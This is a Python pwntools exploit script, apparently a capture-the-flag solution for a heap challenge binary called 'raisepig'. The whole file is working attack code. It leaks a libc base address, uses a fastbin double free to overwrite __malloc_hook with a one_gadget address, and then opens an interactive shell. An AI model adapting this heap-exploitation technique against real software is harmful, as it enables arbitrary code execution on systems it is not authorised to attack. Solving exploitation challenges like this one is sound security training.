#!/usr/bin/env python

from pwn import *
context.log_level="debug"
p = process("./raisepig")

def create(length,name,ctx):
    p.recvuntil("Your choice : ")
    p.sendline("1")
    p.recvuntil("Length of the name :")
    p.sendline(str(length))
    p.recvuntil("The name of pig :")
    p.send(name)
    p.recvuntil("The type of the pig :")
    p.send(ctx)

def show():
    p.recvuntil("Your choice : ")
    p.sendline("2")

def eat_pig(index):
    p.recvuntil("Your choice : ")
    p.sendline("3")
    p.recvuntil("Which pig do you want to eat:")
    p.sendline(str(index))
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")


create(256,"a\n","b\n") # 0
create(256,"b\n","c\n") # 1

eat_pig(0)
create(0xd0,"\n","b\n") # 2
show()
p.recvuntil("Name[2] :")
libc_base=u64(p.recv(6)+"\x00\x00")-0x3c4b0a
print hex(libc_base)
malloc_hook=libc.symbols['__malloc_hook']+libc_base
one_gadget=libc_base+0xf02a4
create(0x60,"ccc\n","bb\n") # 3
create(0x60,"aaa\n","bb\n") # 4

eat_pig(3)
eat_pig(4)
eat_pig(3)
create(0x60,p64(malloc_hook-0x23)+"\n","ccc\n")
create(0x60,"asd\n","dsda\n")
create(0x60,"aa\n","dd\n")
create(0x60,"a"*0x13+p64(one_gadget)+"\n","asdas\n")
p.recvuntil("Your choice : ")
p.sendline("1")
p.interactive()
